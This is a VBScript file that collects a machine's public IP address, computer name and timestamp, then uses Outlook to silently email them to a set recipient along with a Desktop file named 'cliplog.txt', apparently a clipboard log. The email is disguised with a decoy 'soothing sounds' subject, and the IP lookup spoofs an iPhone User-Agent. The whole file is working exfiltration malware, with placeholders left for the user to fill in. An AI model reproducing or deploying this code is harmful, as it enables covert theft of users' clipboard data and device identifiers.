'Time
Function TIME_NOW()
    Dim dt
    dt = Now
    Get_Time = "[" & Right("0" & Day(dt), 2) & "/" & Right("0" & Month(dt), 2) & "/" & Year(dt) & "] [" & Right("0" & Hour(dt), 2) & ":" & Right("0" & Minute(dt), 2) & ":" & Right("0" & Second(dt), 2) & "]"
    TIME_NOW = Get_Time
End Function

WScript.Echo TIME_NOW()

'Public IP
Function IP_ADDRESS()
    Dim objHTTP, strHTML
    Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
    objHTTP.Open "GET", "https://api.ipify.org", False
    objHTTP.setRequestHeader "Content-Type", "text/xml"
    objHTTP.setRequestHeader "User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X)"
    objHTTP.send
    strHTML = objHTTP.responseText
    IP_ADDRESS = strHTML
End Function

WScript.Echo IP_ADDRESS()

'Device Name
Function DEVICE_NAME()
    Set WshNetwork = WScript.CreateObject("WScript.Network")
    DEVICE_NAME = WshNetwork.Computername
End Function

WScript.Echo DEVICE_NAME()

'END OF FUNCTIONS

Function SEND_MAIL()

Const olMailItem = 0

Set objOutlook = CreateObject("Outlook.Application")
Set objMail = objOutlook.CreateItem(olMailItem)

'Spoof Headers 
objMail.Subject = "Fall asleep to these soothing sounds."
objMail.Body = "Sounds that help you reach your dreams." & vbNewLine & vbNewLine & TIME_NOW() & vbNewLine & IP_ADDRESS() & vbNewLine & DEVICE_NAME()

'Recipient Email
objMail.To = "recipient@example.com"

Set objShell = CreateObject("WScript.Shell")
strDesktopPath = objShell.SpecialFolders("Desktop")

' Replace With Your File Path
strAttachmentPath = strDesktopPath & "\cliplog.txt"

Set objFSO = CreateObject("Scripting.FileSystemObject")
If objFSO.FileExists(strAttachmentPath) Then
    objMail.Attachments.Add strAttachmentPath
Else
    MsgBox "Attachment file not found: " & strAttachmentPath
End If

objMail.Send

Set objMail = Nothing
Set objOutlook = Nothing
End Function